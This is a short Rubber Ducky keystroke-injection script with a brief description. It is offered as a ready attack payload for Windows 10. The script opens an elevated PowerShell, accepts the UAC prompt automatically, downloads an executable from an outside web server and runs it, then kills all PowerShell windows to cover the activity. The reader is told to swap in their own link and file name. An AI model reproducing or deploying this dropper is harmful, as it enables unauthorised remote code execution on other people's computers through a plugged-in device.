A ducky script that uses the powershell to download and execute a file from a webserver, then close all powershell windows (with another powershell). Intended for use with windows 10 target, but probably works with Windows 7 and 8.

Change the link and what name to save the file as.


Preview: https://www.youtube.com/watch?v=3WojmjCiXnw

```
REM Windows 10: Poweshell administrator download and execute file
REM Author: Judge2020
REM author website: Judge2020.com
REM
REM start of script
REM
REM let the HID enumerate
DELAY 2000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 500
STRING $down = New-Object System.Net.WebClient; $url = 'http://www.greyhathacker.net/tools/messbox.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
ENTER
REM change delay based on how big of a file and how fast network is
DELAY 2000
GUI r
DELAY 200
REM my best attempt at now closing all powershell instances
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1200
ALT y
DELAY 500
STRING taskkill /F /IM powershell.exe 
ENTER
```